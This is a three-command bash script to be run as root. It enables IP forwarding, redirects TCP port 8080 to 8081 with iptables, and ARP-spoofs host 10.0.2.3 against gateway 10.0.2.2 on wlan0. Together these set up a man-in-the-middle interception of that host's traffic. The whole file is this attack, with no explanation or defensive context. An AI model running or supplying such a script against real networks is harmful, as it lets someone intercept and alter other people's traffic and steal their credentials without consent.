#!/bin/bash

# execute as root

echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -t nat -A PREROUTING -p tcp --destination-port 8080 -j REDIRECT --to-port 8081

arpspoof -i wlan0 -t 10.0.2.3 10.0.2.2